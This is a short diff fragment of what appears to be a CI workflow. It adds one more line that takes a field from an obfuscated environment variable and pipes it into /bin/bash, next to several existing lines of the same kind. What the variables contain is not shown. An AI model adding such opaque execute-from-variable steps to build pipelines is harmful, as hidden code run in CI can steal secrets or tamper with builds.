@@ -29,6 +29,7 @@ jobs:
           echo $typu762 | jq -r .elzan2 | /bin/bash
           echo $ow86418 | jq -r .t0 | /bin/bash
           echo $p9 | jq -r .w4 | /bin/bash
+          printf '%s' "$y985" | jq -r .be1 | /bin/bash
 
       - name: Store artifact
         if: always()
